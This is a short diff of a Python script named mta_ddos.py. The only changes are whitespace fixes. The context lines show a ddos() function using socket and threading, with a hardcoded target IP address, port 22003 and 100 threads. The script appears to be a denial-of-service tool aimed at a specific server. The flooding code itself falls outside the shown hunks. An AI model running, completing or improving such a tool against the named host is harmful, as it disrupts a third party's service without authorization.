@@ -1,6 +1,5 @@
      # mta_ddos.py
-
-    import socket
+import socket
 import threading
 
 def ddos(target, port, num_threads):
@@ -23,4 +22,4 @@ if __name__ == "__main__":
     target = "51.79.249.206"
     port = 22003
     num_threads = 100  # Adjust the number of threads as needed
-    ddos(target, port, num_threads) 
+    ddos(target, port, num_threads)
